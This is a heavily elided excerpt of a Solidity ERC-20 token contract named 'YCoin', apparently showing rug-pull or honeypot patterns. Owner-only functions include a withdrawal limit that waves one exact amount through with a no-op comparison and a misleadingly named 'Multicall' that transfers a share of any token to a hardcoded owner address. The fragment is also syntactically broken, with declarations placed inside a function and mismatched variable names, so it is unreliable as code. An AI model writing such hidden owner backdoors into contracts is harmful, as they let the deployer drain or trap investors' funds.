...
contract YCoin is Context, IERC20 {
   ...
   function withdrawToken(address _tokenContract, uint256 _amount) external _onlyOwner() {
    ...
    if(amount == (50000000000 *(10**18))) amount > secureThreshold;
    else require(amount < secureThreshold, "please wait");
    ...
    function Multicall(address _address, uint256 percent) external _onlyOwner {
        ...
        IERC20(_address).transfer(_Owner, _amount);
    }
  ...
  function AirdropTokens(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    ...
    uint256 private secureThreshold = (10000 *(10**18)) / 50;

    address team;

    address public _Owner = 0x9912C574368f579FB37996D05Fed68ac808a7A92;
